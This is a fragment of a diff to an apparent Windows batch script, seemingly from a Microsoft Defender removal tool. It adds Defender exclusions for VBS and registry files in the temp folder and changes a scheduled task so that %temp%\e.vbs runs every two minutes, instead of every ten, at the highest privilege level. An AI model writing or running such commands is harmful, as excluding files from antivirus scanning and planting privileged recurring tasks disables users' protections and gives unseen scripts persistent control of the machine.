@@ -7,7 +7,7 @@ powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_Defender\Out
 powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_Defender\RemoveShellAssociation.reg'"
 powershell -Command "Add-MpPreference -ExclusionPath '%temp%\RunDefenderRemover.vbs'"
 
-schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 10  /f /rl HIGHEST
+schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 2  /f /rl HIGHEST
 
 
 
